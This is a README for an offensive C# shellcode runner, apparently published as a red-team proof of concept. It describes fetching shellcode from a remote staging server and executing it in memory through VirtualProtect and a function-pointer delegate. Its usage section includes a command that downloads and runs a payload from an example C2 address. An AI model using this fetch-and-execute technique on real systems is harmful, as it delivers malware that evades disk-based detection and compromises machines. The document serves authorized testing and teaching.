# C# Shellcode Runner — Delegate / Function Pointer Technique

A minimal proof-of-concept demonstrating how shellcode can be fetched from a remote staging server and executed on Windows using C#'s `Marshal.GetDelegateForFunctionPointer`. The technique avoids writing shellcode to disk by keeping it in a managed byte array, then marking that region executable with `VirtualProtect` and invoking it through a delegate.

> **Authorized use only.** This tool is published for educational purposes and legitimate red team engagements conducted under a signed scope of work. Misuse against systems you do not own or have explicit written authorization to test is illegal. The authors accept no liability for unauthorized use.

---

## How It Works

1. Fetches a raw shellcode blob from a URL supplied at runtime
2. Calls `VirtualProtect` to set the memory region to `PAGE_EXECUTE_READWRITE`
3. Wraps the pointer in a `StdCall` delegate via `Marshal.GetDelegateForFunctionPointer`
4. Invokes the delegate — control transfers to the shellcode

The URL is intentionally not hardcoded; you supply your own C2 staging endpoint at runtime.

---

## Requirements

- Windows (requires `kernel32.dll`)
- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8.0)

---

## Build

```bash
dotnet build "Function Delegate/Function Delegate.csproj"
```

The project has `AllowUnsafeBlocks` enabled in the `.csproj` — no manual IDE steps required.

---

## Usage

```bash
dotnet run --project "Function Delegate" -- <shellcode-url>
```

Example (replace with your own staging server):

```bash
dotnet run --project "Function Delegate" -- http://192.168.1.100:8080/payload.bin
```

---

## Setup — Pre-commit Hooks

Requires [gitleaks](https://github.com/gitleaks/gitleaks) and Python 3.

```bash
python3 -m venv .venv
.venv/bin/pip install pre-commit
.venv/bin/pre-commit install
```

Hooks run on every commit:
- **gitleaks** — secret scanning (prevents accidental credential commits)
- **dotnet format** — enforces C# formatting conventions

---

## Roadmap

| # | Status | Description |
|---|--------|-------------|
| 1 | ✅ Done | Secret scan + git history scrub |
| 2 | ✅ Done | Upgrade target framework net7.0 → net8.0 LTS |
| 3 | ✅ Done | Parameterise hardcoded engagement URL |
| 4 | ✅ Done | Add `.editorconfig` (Microsoft C# conventions) |
| 5 | ✅ Done | Add `.pre-commit-config.yaml` (gitleaks + dotnet format) |
| 6 | 🔲 Open | Add HTTPS certificate validation option (currently default HttpClient) |
| 7 | 🔲 Open | Support local file path as alternative to URL |
| 8 | 🔲 Open | CI workflow (GitHub Actions) — build + format check on PR |

---

> **Note:** This project has been uplifted for public release with the assistance of Claude (Anthropic). Functionality has been verified during development, but testing across all environments may be incomplete. PRs and fixes are welcome.
